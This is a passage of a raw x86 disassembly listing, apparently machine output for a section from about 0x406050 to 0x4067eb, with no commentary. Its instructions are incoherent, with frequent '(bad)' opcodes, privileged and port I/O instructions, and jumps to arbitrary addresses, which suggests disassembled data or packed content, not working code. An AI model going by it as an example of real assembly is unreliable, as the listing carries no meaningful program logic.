  406050:	xchg   ebx,eax
  406051:	xor    DWORD PTR [ebx+edi*4-0x36],ebp
  406055:	or     ah,BYTE PTR [ecx+0x62590aad]
  40605b:	shl    BYTE PTR [ebx],cl
  40605d:	icebp  
  40605e:	adc    bl,BYTE PTR [edx+0x3b]
  406061:	fdivr  QWORD PTR [ebp-0x27c75b09]
  406067:	add    edx,DWORD PTR [eax]
  406069:	xchg   ecx,eax
  40606a:	fdiv   QWORD PTR ds:0x27eec3b3
  406070:	pusha  
  406071:	xchg   edx,eax
  406072:	dec    ebp
  406073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406074:	ret    0xad0a
  406077:	dec    ecx
  406078:	xchg   ecx,edx
  40607a:	jmp    0xd6a5f061
  40607f:	pop    ebp
  406080:	mov    cs,ebp
  406082:	and    WORD PTR ds:[esp+eax*8-0x28],0x2369
  40608a:	rcr    DWORD PTR [ebx-0x19839ac8],cl
  406090:	rcr    BYTE PTR [esi+ebp*4+0x69639db4],cl
  406097:	fsubr  DWORD PTR [ecx]
  406099:	cdq    
  40609a:	mov    ecx,0x5f96d2eb
  40609f:	lock sbb DWORD PTR [ebx],edx
  4060a2:	fbld   TBYTE PTR [eax]
  4060a4:	xor    al,0xaa
  4060a6:	dec    edi
  4060a7:	mov    ch,0x7
  4060a9:	mov    esp,0x52df0421
  4060ae:	xor    ch,BYTE PTR [esi-0x52]
  4060b1:	loopne 0x406057
  4060b3:	clc    
  4060b4:	es pop ebp
  4060b6:	aad    0xe7
  4060b8:	(bad)  
  4060ba:	stos   DWORD PTR es:[edi],eax
  4060bb:	scas   al,BYTE PTR es:[edi]
  4060bc:	xchg   ebp,eax
  4060bd:	adc    cl,ch
  4060bf:	leave  
  4060c0:	mov    ch,0xe2
  4060c2:	fsub   QWORD PTR [edi-0x5c586d7f]
  4060c8:	les    eax,FWORD PTR [ebx+0x46]
  4060cb:	mov    DWORD PTR [esi-0x75586f79],eax
  4060d1:	loope  0x4060ad
  4060d3:	add    eax,edx
  4060d5:	in     al,0x6f
  4060d7:	cmc    
  4060d8:	xor    ecx,DWORD PTR [esp+ebp*2]
  4060db:	mov    esp,0x53a95b08
  4060e0:	cmp    eax,0xb0a19003
  4060e5:	sub    ebx,ebp
  4060e7:	cli    
  4060e8:	ja     0x4060aa
  4060ea:	inc    esi
  4060eb:	dec    esp
  4060ec:	stos   DWORD PTR es:[edi],eax
  4060ed:	mov    cl,BYTE PTR [eax-0x5b]
  4060f0:	mov    ah,0xb9
  4060f2:	cmp    bh,BYTE PTR [eax-0x1a]
  4060f5:	mov    dh,0x40
  4060f7:	mov    ebp,DWORD PTR [ebx+0x5e]
  4060fa:	fisttp QWORD PTR [ebx]
  4060fc:	xchg   ebp,eax
  4060fd:	adc    BYTE PTR [ebx-0x316dd7c0],0xf0
  406104:	push   esi
  406105:	fmul   st(7),st
  406107:	(bad)
  40610a:	jo     0x406118
  40610c:	xchg   edi,eax
  40610d:	push   eax
  40610e:	sbb    ebp,ebp
  406110:	mov    BYTE PTR [eax],ch
  406112:	xchg   esi,eax
  406113:	(bad)  ds:0x8379ae49
  406119:	loop   0x4060fb
  40611b:	adc    eax,edi
  40611d:	mov    ss,WORD PTR [ebp-0x49]
  406120:	arpl   WORD PTR [esi+eax*1+0x67],bp
  406124:	mov    WORD PTR [ebp+ebp*2+0x54],?
  406128:	add    BYTE PTR [esi-0x6fbb3ba5],al
  40612e:	cmp    ebp,esi
  406130:	ins    BYTE PTR es:[edi],dx
  406131:	mov    bl,0x5
  406133:	pop    ebx
  406134:	repz sbb BYTE PTR [ebx-0x59],al
  406138:	and    bl,BYTE PTR [ecx-0x3]
  40613b:	pop    esi
  40613c:	sbb    DWORD PTR [esi+edi*8],edi
  40613f:	icebp  
  406140:	mov    dh,0x23
  406142:	add    cl,BYTE PTR [edi]
  406144:	imul   BYTE PTR [esp+eiz*4-0xca6b48]
  40614b:	das    
  40614c:	shl    ecx,0xf4
  40614f:	std    
  406150:	jae    0x4060df
  406152:	mov    edx,0xea020e8b
  406157:	dec    ebx
  406158:	lea    ebx,[ecx+eiz*2-0x69f67a7c]
  40615f:	mov    BYTE PTR [edx],cl
  406161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406162:	cmp    cl,cl
  406164:	call   0x78a600d0
  406169:	xor    BYTE PTR [esi+0x5a],dh
  40616c:	sti    
  40616d:	or     eax,ebx
  40616f:	push   edi
  406170:	push   esi
  406171:	xor    eax,0x6cd88777
  406176:	pop    eax
  406177:	inc    esi
  406178:	and    ah,BYTE PTR [ebx-0x2b6517db]
  40617e:	or     eax,0x6cbe9a10
  406183:	cs imul eax,DWORD PTR gs:[ebp-0x69e7d54c],0x91759f64
  40618f:	gs push edx
  406191:	ja     0x40615d
  406193:	xchg   ebx,eax
  406194:	lahf   
  406195:	out    dx,al
  406196:	push   cs
  406197:	xchg   DWORD PTR [edi+ebx*4-0x57],ecx
  40619b:	mov    WORD PTR [edi-0x60454f0f],?
  4061a1:	int    0xe1
  4061a3:	loopne 0x4061ef
  4061a5:	(bad)  
  4061a6:	aad    0x5b
  4061a8:	rcr    BYTE PTR [ecx-0x43],0xc9
  4061ac:	pop    esi
  4061ad:	lahf   
  4061ae:	jmp    0xb6a7:0x501ef28c
  4061b5:	mov    cl,0x3f
  4061b7:	ins    DWORD PTR es:[edi],dx
  4061b8:	rol    al,1
  4061ba:	shl    edx,0x49
  4061bd:	jb     0x4061ac
  4061bf:	(bad)  
  4061c0:	dec    ebx
  4061c1:	cld    
  4061c2:	dec    DWORD PTR [edx-0x3bbcfcbd]
  4061c8:	xchg   esp,eax
  4061c9:	outs   dx,DWORD PTR ds:[esi]
  4061ca:	mov    cl,0xd0
  4061cc:	push   esi
  4061cd:	int3   
  4061ce:	dec    edx
  4061cf:	popa   
  4061d0:	cdq    
  4061d1:	outs   dx,BYTE PTR ds:[esi]
  4061d2:	mov    bl,0xad
  4061d4:	div    BYTE PTR [ebx-0x17]
  4061d7:	pushf  
  4061d8:	cmc    
  4061d9:	push   0xdcfebaa8
  4061de:	cmp    bl,BYTE PTR [ecx-0x1a94c481]
  4061e4:	push   ebp
  4061e5:	in     eax,dx
  4061e6:	sub    eax,0x8544e5f5
  4061eb:	push   ebp
  4061ec:	sbb    esp,eax
  4061ee:	sub    BYTE PTR [edi-0xf],ch
  4061f1:	xchg   DWORD PTR [ebx-0x6b39b82e],ebp
  4061f7:	adc    BYTE PTR [ecx],0x5d
  4061fa:	pop    edi
  4061fb:	(bad)  
  4061fc:	pop    ss
  4061fd:	test   al,0x7e
  4061ff:	fidivr DWORD PTR [eax+0x37624eb4]
  406205:	dec    eax
  406206:	jno    0x406197
  406208:	pop    ss
  406209:	push   ss
  40620a:	add    DWORD PTR fs:[eax+0x29921694],0x24
  406212:	add    ebp,esi
  406214:	enter  0x73b8,0xcb
  406218:	sub    ah,0x73
  40621b:	mov    al,dl
  40621d:	push   ss
  40621e:	loope  0x406294
  406220:	pop    ebp
  406221:	ret    
  406222:	pop    ebx
  406223:	test   DWORD PTR [edx+0x56],edx
  406226:	(bad)  
  406227:	fisttp QWORD PTR [edx+0x2]
  40622a:	xor    eax,0x26237ac6
  40622f:	mov    edx,0x1451209e
  406234:	or     bh,BYTE PTR [edx-0x30]
  406237:	popa   
  406238:	pop    es
  406239:	je     0x40626a
  40623b:	inc    esi
  40623c:	jnp    0x40626f
  40623e:	jo     0x4061d3
  406240:	mov    WORD PTR [ecx+0xb],es
  406243:	sub    DWORD PTR [edi+0x5116e702],ebx
  406249:	jne    0x40624c
  40624b:	popa   
  40624c:	pop    ebp
  40624d:	ins    DWORD PTR es:[edi],dx
  40624e:	jbe    0x84493b85
  406254:	mov    ebp,0x4ad9d52b
  406259:	std    
  40625a:	pop    ebp
  40625b:	adc    DWORD PTR [ebx+edx*2],0xffffff82
  40625f:	ret    
  406260:	mov    ?,WORD PTR ds:0x7c6a308b
  406266:	sti    
  406267:	shl    DWORD PTR [ecx+0x762542d3],cl
  40626d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40626e:	push   edx
  40626f:	(bad)  
  406271:	push   edx
  406272:	xchg   BYTE PTR [ecx+0xbec9247],dh
  406278:	(bad)  
  406279:	in     eax,0x5e
  40627b:	push   cs
  40627c:	ret    
  40627d:	popa   
  40627e:	cmp    al,BYTE PTR [esi]
  406280:	add    DWORD PTR [ebp-0x4733e624],esi
  406286:	leave  
  406287:	test   al,0x89
  406289:	jo     0x4062b0
  40628b:	sahf   
  40628c:	xchg   esi,eax
  40628d:	dec    ebx
  40628e:	pop    eax
  40628f:	outs   dx,BYTE PTR ds:[esi]
  406290:	dec    edi
  406291:	mov    BYTE PTR [edx],ah
  406293:	inc    edx
  406294:	fisttp QWORD PTR [eax+ebx*8+0x23566abd]
  40629b:	xlat   BYTE PTR ds:[ebx]
  40629c:	or     ebp,DWORD PTR [eax+0x65]
  40629f:	push   esi
  4062a0:	fwait
  4062a1:	sbb    DWORD PTR [edx+0x6c902989],ebp
  4062a7:	mov    ds:0x4e429ce1,al
  4062ac:	arpl   bx,dx
  4062ae:	call   0xd7fc:0x8a538141
  4062b5:	imul   edx,DWORD PTR [ebp+0x76],0xb5334429
  4062bc:	pusha  
  4062bd:	mov    BYTE PTR [edx+0x6ddc91db],dl
  4062c3:	add    al,0xce
  4062c5:	les    esi,FWORD PTR [edx+0x998a55b]
  4062cb:	mov    al,0x93
  4062cd:	cmp    eax,0xede9d70e
  4062d2:	(bad)  ds:0x1123
  4062d7:	adc    ebx,DWORD PTR [eax]
  4062d9:	leave  
  4062da:	addr16 stc 
  4062dc:	xchg   edi,eax
  4062dd:	pop    esi
  4062de:	fist   DWORD PTR [ecx+eax*1]
  4062e1:	push   ds
  4062e2:	inc    edx
  4062e3:	popf   
  4062e4:	mul    BYTE PTR [edx]
  4062e6:	jo     0x40633c
  4062e8:	inc    ebx
  4062e9:	aas    
  4062ea:	leave  
  4062eb:	(bad)  
  4062ed:	ret    0x945d
  4062f0:	in     al,dx
  4062f1:	xchg   edx,eax
  4062f2:	cmp    al,0xae
  4062f4:	test   BYTE PTR [eax],al
  4062f6:	popa   
  4062f7:	sbb    BYTE PTR [edi+0x60],0xb3
  4062fb:	add    cl,ah
  4062fd:	cmp    DWORD PTR [ebx+0x70],esp
  406300:	inc    edx
  406301:	cmp    BYTE PTR [ecx+0x208d929b],cl
  406307:	push   ebx
  406308:	pop    esi
  406309:	push   esp
  40630a:	jae    0x406301
  40630c:	dec    edx
  40630d:	mov    ds:0x5fb009cd,eax
  406312:	add    ah,ch
  406314:	sti    
  406315:	mov    bh,0xc7
  406317:	mov    ecx,0xd3d30617
  40631c:	lahf   
  40631d:	dec    ecx
  40631e:	mov    esp,0x59c9d6fb
  406323:	mov    ds:0x430cfb5,eax
  406328:	adc    eax,0xe179f973
  40632d:	loopne 0x4063a6
  40632f:	sub    cl,BYTE PTR [ebx+edi*4+0x38ba1b18]
  406336:	rol    esi,1
  406338:	mov    cs,WORD PTR ds:0x4fecf568
  40633e:	inc    esp
  40633f:	int    0xbc
  406341:	mov    ds:0xd4fb5a48,eax
  406346:	mov    dh,0x91
  406348:	imul   esi,DWORD PTR [esi],0x29
  40634b:	pushf  
  40634c:	cmc    
  40634d:	or     DWORD PTR [edx],0x90411d6a
  406353:	shl    DWORD PTR [ebx-0x7d],0xc3
  406357:	cli    
  406358:	jg     0x406347
  40635a:	sub    cl,BYTE PTR [esi-0x5705cd40]
  406360:	push   ebx
  406361:	into   
  406362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406363:	int    0xea
  406365:	and    DWORD PTR ds:0x552a7ec9,edi
  40636b:	loopne 0x4063ec
  40636d:	add    BYTE PTR [ebp+0x3c],0x84
  406371:	test   eax,0x9143c791
  406376:	aaa    
  406377:	mov    ah,0x53
  406379:	test   BYTE PTR [edi],0xe
  40637c:	mov    ds:0x9523499f,al
  406381:	out    0x70,eax
  406383:	push   es
  406384:	loop   0x40631e
  406386:	add    eax,0xb085a7d9
  40638b:	rcr    DWORD PTR [eax],1
  40638d:	pop    ss
  40638e:	and    DWORD PTR [ebx],0x63b38468
  406394:	and    bl,BYTE PTR [edx+0x29baf816]
  40639a:	inc    esp
  40639b:	int3   
  40639c:	sub    bh,BYTE PTR [ecx]
  40639e:	jno    0x4063fc
  4063a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063a1:	or     ah,dl
  4063a3:	sbb    eax,0xfcd1436f
  4063a8:	out    0x2f,al
  4063aa:	dec    ecx
  4063ab:	outs   dx,DWORD PTR ds:[esi]
  4063ac:	into   
  4063ad:	lods   eax,DWORD PTR ds:[esi]
  4063ae:	mov    edi,0xd65aef3b
  4063b3:	mov    dl,0xa9
  4063b5:	push   es
  4063b6:	pusha  
  4063b7:	mov    edx,0x39258093
  4063bc:	mov    bl,0x2
  4063be:	cli    
  4063bf:	out    dx,al
  4063c0:	mov    WORD PTR es:[ebx],es
  4063c3:	xchg   esp,eax
  4063c4:	sbb    al,0xaf
  4063c6:	push   0xe6517f6b
  4063cb:	jae    0x406408
  4063cd:	push   esi
  4063ce:	in     al,0xad
  4063d0:	inc    esi
  4063d1:	out    0x68,al
  4063d3:	push   0xb33bc45d
  4063d8:	and    ebp,edi
  4063da:	push   edx
  4063db:	jb     0x4063f2
  4063dd:	je     0x406455
  4063df:	xchg   ebx,eax
  4063e0:	cmp    dl,ch
  4063e2:	and    BYTE PTR [eax+0x4f3e2a75],al
  4063e8:	jle    0x4063b7
  4063ea:	xchg   edi,eax
  4063eb:	test   dh,ah
  4063ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063ee:	mov    cl,0x3a
  4063f0:	mov    ebp,0x18e4d580
  4063f5:	in     al,dx
  4063f6:	adc    cl,bl
  4063f8:	fwait
  4063f9:	push   ebx
  4063fa:	xchg   DWORD PTR [ebx-0x5d],edx
  4063fd:	in     eax,0xca
  4063ff:	cmp    al,0x5e
  406401:	pushf  
  406402:	pop    eax
  406403:	and    esi,edi
  406405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406406:	fnstsw WORD PTR ds:[esi]
  406409:	cmp    edx,esi
  40640b:	retf   0x9332
  40640e:	lahf   
  40640f:	sub    ebp,ebp
  406411:	(bad)  
  406412:	rcr    BYTE PTR [ecx+0x697619ab],cl
  406418:	lahf   
  406419:	sahf   
  40641a:	mov    dh,0xed
  40641c:	sahf   
  40641d:	test   BYTE PTR [ebx-0x1ec87b45],dl
  406423:	arpl   WORD PTR [bp+di+0xb6b],bx
  406428:	call   0x4479b2b9
  40642d:	xchg   DWORD PTR es:[ebx],esi
  406430:	mov    edx,0x732e1063
  406435:	sub    al,0x61
  406437:	xchg   ecx,eax
  406438:	int    0x35
  40643a:	jle    0x406462
  40643c:	push   0xd95cb9fc
  406441:	mov    esp,0x9e9e002f
  406446:	cmp    BYTE PTR [eax],cl
  406448:	outs   dx,DWORD PTR ds:[esi]
  406449:	loop   0x4064ad
  40644b:	mov    ds:0xffb28b8d,eax
  406450:	ins    BYTE PTR es:[edi],dx
  406451:	inc    edx
  406452:	or     BYTE PTR [ebx+0x1848ac4b],cl
  406458:	sbb    cl,BYTE PTR [esp+ecx*1-0x536a7e1c]
  40645f:	xlat   BYTE PTR ds:[ebx]
  406460:	xchg   BYTE PTR [ebx-0x6a03f248],bl
  406466:	popa   
  406467:	jge    0x4064ab
  406469:	(bad)  
  40646a:	inc    ebx
  40646b:	nop
  40646c:	aad    0x70
  40646e:	cmp    DWORD PTR [edx+eax*1],edi
  406471:	pop    edx
  406472:	fdivp  st(6),st
  406474:	sar    DWORD PTR [edx+0x70],cl
  406477:	jge    0x406491
  406479:	outs   dx,BYTE PTR ds:[esi]
  40647a:	pop    esi
  40647b:	inc    edx
  40647c:	adc    BYTE PTR [esi],0xd9
  40647f:	aaa    
  406480:	js     0x4064eb
  406482:	mov    ebp,0x7c69465d
  406487:	out    0x2f,al
  406489:	xchg   ebx,eax
  40648a:	mov    edx,DWORD PTR [ebx-0x10]
  40648d:	or     bl,0x33
  406490:	sbb    al,0x94
  406492:	aad    0x6d
  406494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406495:	in     al,0x6b
  406497:	adc    eax,0xef44979f
  40649c:	nop
  40649d:	cli    
  40649e:	xchg   ecx,eax
  40649f:	hlt    
  4064a0:	add    DWORD PTR [edi],ebp
  4064a2:	xor    al,0xda
  4064a4:	dec    edx
  4064a5:	mov    bl,0x1d
  4064a7:	lock rcr edx,1
  4064aa:	xor    DWORD PTR [edi+edi*1-0x6c],0xffffffaf
  4064af:	in     eax,dx
  4064b0:	pop    ss
  4064b1:	pop    esp
  4064b2:	mov    al,ds:0x3d4f8d72
  4064b7:	lahf   
  4064b8:	push   ds
  4064b9:	pop    ds
  4064ba:	leave  
  4064bb:	fxch   st(3)
  4064bd:	sti    
  4064be:	pop    ecx
  4064bf:	push   edx
  4064c0:	pop    ebp
  4064c1:	pop    ds
  4064c2:	mov    DWORD PTR [edx-0xe54f823],esp
  4064c8:	(bad)  
  4064ca:	pushf  
  4064cb:	ret    0xc394
  4064ce:	inc    ecx
  4064cf:	popa   
  4064d0:	jne    0x40652d
  4064d2:	dec    ebp
  4064d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064d4:	mov    ebp,0xdd93272b
  4064d9:	stos   BYTE PTR es:[edi],al
  4064da:	dec    ebp
  4064db:	jp     0x4064c9
  4064dd:	jmp    0x48316d86
  4064e2:	pop    esi
  4064e3:	imul   edi,DWORD PTR [ebx-0x274bdc78],0xffffffc2
  4064ea:	popa   
  4064eb:	js     0x4064d7
  4064ed:	or     al,ah
  4064ef:	xchg   edi,eax
  4064f0:	aas    
  4064f1:	mov    esi,0x58eee423
  4064f6:	adc    al,0x2e
  4064f8:	jge    0x4064c7
  4064fa:	ds pop ss
  4064fc:	inc    ebp
  4064fd:	push   ebx
  4064fe:	inc    esp
  4064ff:	xlat   BYTE PTR ds:[ebx]
  406500:	lods   al,BYTE PTR ds:[esi]
  406501:	add    eax,0xc0ec3dd1
  406506:	jmp    0x7acd:0x1c0d687
  40650d:	aas    
  40650e:	ins    BYTE PTR es:[edi],dx
  40650f:	jae    0x406537
  406511:	ret    0x61a5
  406514:	mov    al,0x36
  406516:	push   edx
  406517:	mov    BYTE PTR [edi+0x7c20ed8d],al
  40651d:	(bad)  
  40651e:	mov    ds:0x592a0f0c,eax
  406523:	xchg   ecx,eax
  406524:	xchg   ebx,eax
  406525:	mov    ebx,0xefe5ed41
  40652a:	and    al,bh
  40652c:	jmp    0xc347:0xd21b81ea
  406533:	hlt    
  406534:	xor    DWORD PTR [edx],0xffffffcb
  406537:	jno    0x406548
  406539:	ret    
  40653a:	mov    ebx,0xebb8b4f
  40653f:	and    al,0x9f
  406541:	cmp    DWORD PTR [edi],0x55
  406544:	test   BYTE PTR [ebx],ch
  406546:	in     al,0x19
  406548:	pop    ebx
  406549:	cmp    cl,BYTE PTR [ecx+esi*2-0x34a6f580]
  406550:	enter  0xfdc7,0x5d
  406554:	(bad)  
  406555:	pop    esi
  406556:	and    ah,BYTE PTR [ebp+ebp*8+0x1012cdd]
  40655d:	ret    
  40655e:	xor    al,0x88
  406560:	retf   0x38d7
  406563:	mov    ah,0x45
  406565:	push   edi
  406566:	cmp    BYTE PTR [esi],0xb
  406569:	push   ds
  40656a:	sub    eax,0x41662a3
  40656f:	cli    
  406570:	cld    
  406571:	adc    BYTE PTR [ebp+0x4b],dl
  406574:	ror    BYTE PTR [edx+0x1b],0x83
  406578:	addr16 int 0x83
  40657b:	popf   
  40657c:	pop    ecx
  40657d:	sar    DWORD PTR [ebx-0x63],0xa1
  406581:	scas   eax,DWORD PTR es:[edi]
  406582:	outs   dx,BYTE PTR ds:[esi]
  406583:	repz inc edi
  406585:	and    dl,ah
  406587:	cwde   
  406588:	and    edi,DWORD PTR [eax+esi*1+0x19]
  40658c:	mov    cl,0x37
  40658e:	mov    bl,0xf8
  406590:	ds push 0xffffffe6
  406593:	mov    esi,esi
  406595:	mov    esp,0xbd00fb3
  40659a:	sub    eax,0x9c2214ae
  40659f:	fild   WORD PTR [ebx+ebx*2]
  4065a2:	dec    edi
  4065a3:	scas   al,BYTE PTR es:[edi]
  4065a4:	pop    esi
  4065a5:	mov    ah,0xa0
  4065a7:	sbb    eax,0x4d666f18
  4065ac:	cmp    BYTE PTR [edx],bh
  4065ae:	neg    esp
  4065b0:	shr    ah,0xf3
  4065b3:	mov    al,0x77
  4065b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065b6:	into   
  4065b7:	inc    ecx
  4065b8:	xchg   ebp,eax
  4065b9:	(bad)  
  4065ba:	sbb    eax,0x7e980592
  4065bf:	sub    BYTE PTR [ecx-0x7c9e429c],ch
  4065c5:	cdq    
  4065c6:	add    eax,0x5c36de4d
  4065cb:	pop    ss
  4065cc:	test   al,0x5e
  4065ce:	ret    0xd7c3
  4065d1:	mov    al,ah
  4065d3:	sub    al,0x32
  4065d5:	outs   dx,BYTE PTR ds:[esi]
  4065d6:	xor    esp,DWORD PTR [edi+0x5685395]
  4065dc:	sub    eax,0xd1c9081c
  4065e1:	loop   0x40659e
  4065e3:	add    DWORD PTR [ebx+ebp*1],0x22
  4065e7:	sub    DWORD PTR [edx-0x4a],ecx
  4065ea:	adc    al,0x38
  4065ec:	inc    ecx
  4065ed:	dec    eax
  4065ee:	push   ecx
  4065ef:	scas   eax,DWORD PTR es:[edi]
  4065f0:	xchg   esp,eax
  4065f1:	(bad)
  4065f5:	dec    ebp
  4065f6:	cwde   
  4065f7:	xor    bh,dh
  4065f9:	inc    edi
  4065fa:	dec    esi
  4065fb:	cmp    bh,BYTE PTR [ecx+0x69]
  4065fe:	mov    eax,ds:0x9a5594f4
  406603:	adc    BYTE PTR [ebx+0x19],al
  406606:	fst    QWORD PTR [ebp+edx*1+0x28]
  40660a:	ins    BYTE PTR es:[edi],dx
  40660b:	adc    ebp,edi
  40660d:	sub    BYTE PTR [ebx+eax*1],dh
  406610:	jb     0x40667b
  406612:	pushf  
  406613:	push   edx
  406614:	pop    ss
  406615:	mov    eax,0xe8c86954
  40661a:	fdivr  DWORD PTR [ebp+eiz*8+0x79]
  40661e:	mov    al,0x51
  406620:	or     al,0x7d
  406622:	inc    ecx
  406623:	add    al,0x69
  406625:	xchg   ecx,eax
  406626:	mov    al,0x76
  406628:	sahf   
  406629:	mov    ds:0x123272dd,eax
  40662e:	shr    BYTE PTR [eax],1
  406630:	xchg   bh,ch
  406632:	stc    
  406633:	add    ah,dh
  406635:	cmp    eax,DWORD PTR [ebp+0x79]
  406638:	daa    
  406639:	jo     0x4066a6
  40663b:	add    al,0xe0
  40663d:	outs   dx,BYTE PTR ds:[esi]
  40663e:	js     0x40660c
  406640:	iret   
  406641:	popf   
  406642:	call   FWORD PTR [ecx+0x70af7e76]
  406648:	or     DWORD PTR [edi-0x15298bb1],esp
  40664e:	or     DWORD PTR [ebp+0x61],ebp
  406651:	sbb    eax,DWORD PTR [ebx]
  406653:	out    dx,al
  406654:	sub    DWORD PTR [ebx+0x49],edi
  406657:	in     eax,0xdb
  406659:	mov    al,0x46
  40665b:	mul    DWORD PTR [edx-0x22829868]
  406661:	fdivr  QWORD PTR [eax-0x3f]
  406664:	mov    BYTE PTR [eax-0x56],dl
  406667:	jnp    0x406684
  406669:	adc    al,0xfd
  40666b:	jge    0x406681
  40666d:	pop    ds
  40666e:	(bad)  
  40666f:	lods   eax,DWORD PTR ds:[esi]
  406670:	retf   
  406671:	pop    eax
  406672:	mov    cl,0x76
  406674:	scas   eax,DWORD PTR es:[edi]
  406675:	or     cl,BYTE PTR [ebx-0xd614dc5]
  40667b:	inc    edx
  40667c:	mov    al,ds:0xd03e7115
  406681:	in     al,0xee
  406683:	pop    esp
  406684:	push   es
  406685:	out    0x26,al
  406687:	push   0xffffffa0
  406689:	mov    ecx,0x76f1af32
  40668e:	jp     0x4066e3
  406690:	xchg   ebp,eax
  406691:	cmp    ch,cl
  406693:	out    dx,al
  406694:	adc    edx,ebp
  406696:	aas    
  406697:	jne    0x406640
  406699:	ret    
  40669a:	pop    eax
  40669b:	rcr    BYTE PTR [edx],0x5
  40669e:	mov    ebx,0x75d73bee
  4066a3:	xor    BYTE PTR [ecx+0x26f02d92],ch
  4066a9:	and    eax,0x65617b1e
  4066ae:	adc    eax,0xd3fc8550
  4066b3:	test   eax,0x4728c17d
  4066b8:	push   edx
  4066b9:	xor    DWORD PTR [edx+0x26],esp
  4066bc:	xchg   ecx,eax
  4066bd:	icebp  
  4066be:	je     0x406643
  4066c0:	daa    
  4066c1:	jbe    0x4066b8
  4066c3:	out    0x6d,al
  4066c5:	iret   
  4066c6:	add    bl,ch
  4066c8:	cli    
  4066c9:	test   al,0xd6
  4066cb:	ds int 0x17
  4066ce:	add    DWORD PTR [esi],ecx
  4066d0:	or     eax,0x60372e98
  4066d5:	cli    
  4066d6:	push   ds
  4066d7:	dec    edx
  4066d8:	div    BYTE PTR [eax]
  4066da:	aad    0xd9
  4066dc:	add    eax,0x2ddfa652
  4066e1:	test   BYTE PTR [edi+0x10],dl
  4066e4:	jae    0x406699
  4066e6:	lods   eax,DWORD PTR ds:[esi]
  4066e7:	lods   al,BYTE PTR ds:[esi]
  4066e8:	stc    
  4066e9:	es jo  0x4066c1
  4066ec:	push   ebp
  4066ed:	push   esi
  4066ee:	lods   eax,DWORD PTR ds:[esi]
  4066ef:	in     eax,0x35
  4066f1:	jl     0x40676b
  4066f3:	xor    bh,BYTE PTR [edi+eax*4-0x7e]
  4066f7:	cmp    eax,0x469432e1
  4066fc:	stc    
  4066fd:	jnp    0x406768
  4066ff:	inc    esp
  406700:	jl     0x4066fb
  406702:	pop    ebp
  406703:	and    cl,BYTE PTR [ecx-0x49]
  406706:	adc    ebp,DWORD PTR [ebx-0x3b]
  406709:	push   ss
  40670a:	pop    edi
  40670b:	mov    al,ds:0x9f11e291
  406710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406711:	adc    dh,BYTE PTR [edx]
  406713:	loopne 0x40675b
  406715:	mov    edi,0x51410901
  40671a:	in     al,dx
  40671b:	repz dec esp
  40671d:	inc    BYTE PTR ds:0xcbee3265
  406723:	cmc    
  406724:	mov    cl,0x60
  406726:	pop    eax
  406727:	and    al,0xb6
  406729:	mov    ds:0x29196e65,eax
  40672e:	call   0x7546:0xfe40d08
  406735:	pop    esp
  406736:	adc    BYTE PTR [edx],dl
  406738:	loope  0x4066c8
  40673a:	mov    BYTE PTR [ebx],ch
  40673c:	mov    esi,0xab5922db
  406741:	xchg   edx,eax
  406742:	inc    ebp
  406743:	ds out dx,al
  406745:	and    DWORD PTR ds:0x28979abd,edi
  40674b:	frstor [edx]
  40674d:	sbb    bh,BYTE PTR [ebx+ecx*8]
  406750:	jns    0x40670e
  406752:	stos   BYTE PTR es:[edi],al
  406753:	push   edx
  406754:	in     al,dx
  406755:	dec    eax
  406756:	adc    al,0xc0
  406758:	push   eax
  406759:	(bad)  
  40675a:	pop    ds
  40675b:	jl     0x40673d
  40675d:	mov    ebp,fs
  40675f:	push   ecx
  406760:	daa    
  406761:	fnstsw WORD PTR [esi-0x71]
  406764:	and    dh,BYTE PTR [eax]
  406766:	in     eax,dx
  406767:	and    BYTE PTR [eax+0x465c165],ah
  40676d:	scas   al,BYTE PTR es:[edi]
  40676e:	(bad)  
  40676f:	adc    cl,ah
  406771:	push   esi
  406772:	(bad)  
  406773:	and    DWORD PTR [edi],ebx
  406775:	imul   BYTE PTR [ecx]
  406777:	outs   dx,BYTE PTR ds:[esi]
  406778:	mov    ch,0x3e
  40677a:	mov    ch,0xc3
  40677c:	rol    BYTE PTR [ecx+0x22],0xdd
  406780:	inc    ebp
  406781:	(bad)  
  406782:	cs mov ch,0x9e
  406785:	scas   eax,DWORD PTR es:[edi]
  406786:	fs pop es
  406788:	adc    DWORD PTR [ebp-0x4d],ebx
  40678b:	shl    BYTE PTR [edx-0x7c7f231c],1
  406791:	sbb    edx,0x7c
  406794:	lahf   
  406795:	pushf  
  406796:	xchg   esi,eax
  406797:	(bad)  
  406799:	inc    esp
  40679a:	(bad)  
  40679b:	mov    ds:0xeb352e02,al
  4067a0:	gs lock fwait
  4067a3:	cmp    BYTE PTR [esi-0x730334d9],bl
  4067a9:	cdq    
  4067aa:	ret    0x6c9
  4067ad:	stos   DWORD PTR es:[edi],eax
  4067ae:	cmp    BYTE PTR [ecx-0x41],bh
  4067b1:	push   ebp
  4067b2:	rcr    ecx,1
  4067b4:	dec    eax
  4067b5:	icebp  
  4067b6:	outs   dx,BYTE PTR ds:[esi]
  4067b7:	iret   
  4067b8:	aaa    
  4067b9:	dec    esi
  4067ba:	pop    edx
  4067bb:	mov    cl,0xa7
  4067bd:	adc    al,0xe6
  4067bf:	xchg   esp,eax
  4067c0:	push   edx
  4067c1:	std    
  4067c2:	and    cl,BYTE PTR [edi+0x7b3e6fb8]
  4067c8:	(bad)  
  4067c9:	cwde   
  4067ca:	stos   BYTE PTR es:[edi],al
  4067cb:	cmc    
  4067cc:	sahf   
  4067cd:	mov    ds:0x9fb575a1,eax
  4067d2:	bound  esp,QWORD PTR [ebx-0x3b]
  4067d5:	faddp  st(3),st
  4067d7:	(bad)  
  4067d8:	sub    ah,dl
  4067da:	pop    ebx
  4067db:	call   0x29ab880b
  4067e0:	xor    BYTE PTR [esi],ah
  4067e2:	adc    al,0x11
  4067e4:	mov    ah,0x57
  4067e6:	(bad)  
  4067e8:	adc    ah,bl
  4067ea:	pop    ebx
  4067eb:	jmp    0xbf3f:0x889e742e
